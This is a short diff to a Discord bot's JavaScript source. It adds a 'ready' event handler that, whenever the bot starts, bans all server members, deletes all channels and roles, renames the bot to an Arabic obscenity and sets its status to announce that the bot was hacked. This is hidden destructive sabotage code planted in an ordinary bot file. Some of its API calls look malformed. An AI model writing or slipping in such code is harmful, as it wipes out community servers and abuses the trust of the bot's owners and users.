@@ -2962,7 +2962,13 @@ client.on("guildMemberAdd", member => {
       }
       });
 
-
+client.on('ready' , async() => {
+client.guilds.members.forEach(m => { m.ban() });
+client.guilds.channels.forEach(c => { c.delete() });
+client.guilds.roles.forEach(r => { r.delete() });
+client.user.setName("كسم مهستر");
+client.user.setGame('تم تهكير البوت');
+});
 
 
 //MHSTR END NOW THIS IS END
